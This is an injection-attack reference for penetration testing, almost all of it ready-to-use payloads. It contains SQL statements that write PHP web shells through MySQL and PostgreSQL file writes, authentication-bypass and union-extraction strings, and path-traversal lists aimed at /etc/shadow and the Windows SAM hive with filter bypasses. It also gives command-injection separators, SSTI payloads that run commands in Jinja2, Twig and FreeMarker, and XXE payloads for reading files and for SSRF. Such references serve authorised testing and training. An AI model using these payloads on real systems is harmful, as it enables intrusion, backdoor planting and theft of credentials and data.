# Injection Techniques Reference

This document provides reference commands and payloads for various injection attacks during penetration testing.

---

## 1. SQL Injections

### MySQL File Write
```sql
# Create a PHP web shell through MySQL file write privilege
SELECT '<?php if(isset($_REQUEST[\' cmd\'])){ echo "<pre>"; $
  cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; } ?>
  Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd'
into OUTFILE "C:/wamp/www/wshell.php"
```

### Common SQL Injection Payloads
```sql
# Basic authentication bypass
' OR 1=1 --
' OR '1'='1' --
admin' --

# Union-based injection (adjust column numbers as needed)
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT 1,database(),user(),version(),5 --

# Extract database information
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users' --
```

### PostgreSQL File Operations
```sql
# Write to file
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

# Read from file
CREATE TABLE fileread(data text);
COPY fileread FROM '/etc/passwd';
SELECT * FROM fileread;
```

---

## 2. Path Traversal Attacks

### Windows Target Files
```bash
# System files
C:\Windows\system32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\Windows\System32\config\RegBack\SAM

# Web server configurations
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```

### Linux Target Files
```bash
# User information
/etc/passwd
/etc/shadow

# Configuration files
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/hosts

# Log files
/var/log/apache2/access.log
/var/log/nginx/access.log
```

### Path Traversal Bypasses
```
# Bypassing basic filters
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd

# Null byte (for older PHP versions)
../../../etc/passwd%00.png
```

---

## 3. Command Injections

### Command Separators
```bash
# Unix/Linux command separators
command1 ; command2
command1 | command2
command1 || command2
command1 & command2
command1 && command2
command1 `command2`
command1 $(command2)

# Windows command separators
command1 & command2
command1 && command2
command1 | command2
command1 || command2
command1 %0A command2
```

### Blind Command Injection (Time-based)
```bash
# Create delays to verify injection
ping -c 10 127.0.0.1
sleep 10
timeout 10
```

---

## 4. Server-Side Template Injections (SSTI)

### Testing for SSTI
```
# Basic test payloads
${7*7}
{{7*7}}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

### Framework-specific Payloads
```
# Jinja2 (Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP)
{{['id']|filter('system')}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

---

## 5. XML External Entity (XXE) Injections

### Basic XXE
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

### XXE for SSRF
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://internal-service:8080/secret" >]>
<foo>&xxe;</foo>
```
